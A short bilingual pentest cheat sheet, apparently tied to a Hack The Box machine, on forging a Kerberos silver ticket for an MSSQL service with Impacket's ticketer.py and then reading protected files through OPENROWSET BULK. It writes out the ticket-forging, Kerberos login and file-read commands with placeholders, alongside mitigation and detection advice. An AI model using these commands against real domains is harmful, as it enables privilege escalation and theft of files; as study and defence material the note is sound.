---
topic: MSSQL — silver ticket and OPENROWSET BULK
tags: [windows, mssql, kerberos, silver-ticket, openrowset, privesc]
---

# MSSQL — silver ticket and OPENROWSET BULK

**English** | [🌐 Español](mssql-silver-ticket.md)

## Concept

With the MSSQL service account's NTLM hash, forge a TGS for the `MSSQLSvc` SPN. The ticket includes arbitrary groups in the PAC, allowing `sysadmin`; `OPENROWSET(BULK ...)` reads files with those groups.

## When it applies

- You have the MSSQL service account hash or password.
- You know the domain, SID and SPN.
- The service accepts Kerberos.

## Procedure

1. Compute the NTLM from the password or crack NetNTLMv2.
2. Get the domain SID and a privileged group RID.
3. Forge the ticket with `ticketer.py` and use it with `mssqlclient.py`.
4. Read files with `OPENROWSET`.
5. Search histories for credentials.

## Commands

```bash
ticketer.py -nthash <HASH> -domain-sid <SID> -domain <DOMAIN> \
  -spn MSSQLSvc/DC01.<DOMAIN>:1433 -groups 1105 <USER>
KRB5CCNAME=<USER>.ccache mssqlclient.py -no-pass -k DC01.<DOMAIN>
SQL> SELECT * FROM OPENROWSET(BULK 'C:\Users\Administrator\Desktop\root.txt', SINGLE_CLOB) AS x;
```

## Variants

- Silver ticket for other SPNs (HTTP, CIFS).
- Add several group RIDs.
- Combine with NTLM relay or GodPotato.

## Limitations

- The correct service hash is required.
- The SPN must match exactly.
- Protected accounts may reject the ticket.

## Mitigation

- Use gMSA and rotate service passwords.
- Restrict `sysadmin` and audit tickets.
- Enforce SMB signing and limit NTLM.

## Detection

- Tickets with unusual groups.
- `OPENROWSET` reading administrator paths.
- Kerberos authentication from unusual hosts.

## References

- [0xdf — Signed](https://0xdf.gitlab.io/2026/02/07/htb-signed.html)
- [Impacket — ticketer](https://github.com/fortra/impacket/blob/master/examples/ticketer.py)
- [Microsoft — OPENROWSET](https://learn.microsoft.com/en-us/sql/t-sql/functions/openrowset-transact-sql)
